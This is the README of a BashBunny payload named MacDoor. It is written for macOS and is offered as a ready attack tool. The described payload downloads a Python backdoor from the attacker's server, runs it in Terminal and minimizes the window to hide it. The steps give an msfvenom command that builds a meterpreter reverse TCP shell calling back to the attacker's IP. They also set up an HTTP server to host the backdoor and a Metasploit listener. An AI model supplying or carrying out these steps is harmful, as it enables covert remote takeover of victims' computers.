# MacDoor - Python Backdoor Execution for the BashBunny


    __  ___              ____                     
   /  |/  /____ _ _____ / __ \ ____   ____   _____
  / /|_/ // __ `// ___// / / // __ \ / __ \ / ___/
 / /  / // /_/ // /__ / /_/ // /_/ // /_/ // /    
/_/  /_/ \__,_/ \___//_____/ \____/ \____//_/     


* Author:     afsh4ck
* Version:    1.0
* Target:     MacOS
* Tested on:  Ventura 13.3.1
* Category:   Execution

# DESCRIPTION

Download a Python backdoor from our server, run it in terminal and minimize the terminal window.

# STEPS

* Step 1: msfvenom -p python/meterpreter/reverse_tcp LHOST={your IP} LPORT=4444 -o backdoor.py  
* Step 2: mount a local server 'python3 -m http.server'  
* Step 3: msfconsole multi/handler listener open before the attack.

# NOTE

* You need to modify the script with your attacker IP and the port or your local server.

